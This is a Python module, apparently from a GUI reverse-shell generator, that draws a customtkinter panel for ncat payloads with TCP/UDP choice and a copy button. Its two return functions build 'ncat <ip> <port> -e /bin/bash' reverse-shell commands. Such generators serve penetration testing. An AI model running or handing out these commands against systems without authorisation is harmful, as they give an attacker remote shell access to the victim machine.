import customtkinter, pyperclip, tkinter
from modules.get import select_list as shell_list
from modules.activate import Activate

def select_callback(self):
    self.rs_selected = self.select_shell_var.get()
    Activate.update_rs(self)

class rs_ncat:

    def __init__(self, RSGeneratorApp) -> None:
          
        self = RSGeneratorApp
        
        self.rs_ncat_shell = rs_ncat.return_rs_ncat_tcp(self)

        self.rs_ncat_label_frame = customtkinter.CTkFrame(self.rs_frame)
        self.rs_ncat_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

        self.rs_ncat_select_shell = customtkinter.CTkOptionMenu(self.rs_ncat_label_frame, variable=self.select_shell_var, command=lambda value:select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
        self.rs_ncat_select_shell.configure(values=shell_list())
        self.rs_ncat_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
        self.rs_ncat_label_frame.grid_columnconfigure(1, weight=1)

        self.rdbtn_frame_2 = customtkinter.CTkFrame(self.rs_frame)
        self.rdbtn_frame_2.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)

        self.rs_ncat_radio_var = tkinter.IntVar(value=0)
        radiobutton_1 = customtkinter.CTkRadioButton(self.rdbtn_frame_2, text="TCP",variable=self.rs_ncat_radio_var, value=0, command=lambda:rs_ncat.change_rs_ncat_type(self),fg_color=self.colormain,hover_color=self.color_hover)
        radiobutton_1.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
        radiobutton_2 = customtkinter.CTkRadioButton(self.rdbtn_frame_2, text="UDP",variable=self.rs_ncat_radio_var, value=1, command=lambda:rs_ncat.change_rs_ncat_type(self),fg_color=self.colormain,hover_color=self.color_hover)
        radiobutton_2.grid(row=1, column=2, columnspan=4, padx=10, pady=10, sticky="ew")

        self.rs_ncatlabel = customtkinter.CTkTextbox(self.rs_frame,)
        self.rs_ncatlabel.insert("0.0", text=self.rs_ncat_shell);self.rs_ncatlabel.configure(state="disabled")
        self.rs_ncatlabel.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

        btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(self.rs_ncat_shell))
        btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
        btn_copy.configure(fg_color=self.colormain)
        
        rs_ncat.change_rs_ncat_type(self)
    
    def change_rs_ncat_type(self):
        val = self.rs_ncat_radio_var.get()
        if val == 0:
            self.rs_ncat_shell = rs_ncat.return_rs_ncat_tcp(self)
            self.rs_ncatlabel.configure(state="normal");self.rs_ncatlabel.delete("0.0", "end")
            self.rs_ncatlabel.insert("0.0", text=self.rs_ncat_shell);self.rs_ncatlabel.configure(state="disabled")
        elif val == 1:
            self.rs_ncat_shell = rs_ncat.return_rs_ncat_udp(self)
            self.rs_ncatlabel.configure(state="normal");self.rs_ncatlabel.delete("0.0", "end")
            self.rs_ncatlabel.insert("0.0", text=self.rs_ncat_shell);self.rs_ncatlabel.configure(state="disabled")

    def return_rs_ncat_tcp(self):
        return f"ncat {self.ip_selected} {self.port_selected} -e /bin/bash"
    
    def return_rs_ncat_udp(self):
        return f"ncat --udp {self.ip_selected} {self.port_selected} -e /bin/bash"
    